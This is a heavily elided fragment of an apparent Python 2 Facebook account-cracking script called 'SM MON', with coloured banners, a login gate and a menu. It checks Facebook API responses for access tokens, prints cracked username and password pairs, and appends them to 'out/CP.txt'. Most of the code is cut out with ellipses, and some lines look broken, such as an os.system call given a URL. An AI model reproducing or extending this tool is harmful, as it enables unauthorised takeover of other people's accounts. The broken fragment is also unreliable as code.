...
\033[1;97m─────────▀█▓█▀─────────J
\033[1;97m───────────▀───────────U
\033[1;98m─────I Fear None But Allah─────T
\033[1;97m─────We Love Muhammad─────Y
\033[1;95m        ♦♦♦===================================♦♦♦
\033[1;95m❤─────── SM MON ───────❤
                         Sm-Mon Updated 0.3                   
\033[1;91m        ♦♦♦===================================♦♦♦
...
jalan("\033[1;94m•◈•──────•◈• The mind is not someone's slave •◈•──────•◈•")  
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            ...
            os.system('https://www.youtube.com/channel/UCk9SbjpUFC-hhFMeh16FhDw')
    else:
...
def menu():
	...
	print "\033[1;32;40m[2] \033[1;33;40m══Update Mon"																														
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[After1day] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
							cek = open("out/CP.txt", "a")
